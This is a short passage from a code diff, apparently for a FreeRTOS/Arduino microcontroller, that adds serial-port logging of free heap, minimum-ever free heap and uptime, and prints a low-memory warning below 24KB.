+    size_t minHeap = xPortGetMinimumEverFreeHeapSize();
+    char diagBuf[96];
+    snprintf(diagBuf, sizeof(diagBuf), "[DIAG] FreeHeap=%luB MinEver=%luB Uptime=%lus",
+             (unsigned long)freeHeap,
+             (unsigned long)minHeap,
+             (unsigned long)(nowDiagMs / 1000UL));
+    Serial.println(diagBuf);
+    if (freeHeap < 24576) {
+      Serial.println("[WARN] Low FreeHeap (<24KB)!");
+    }
   }
 }
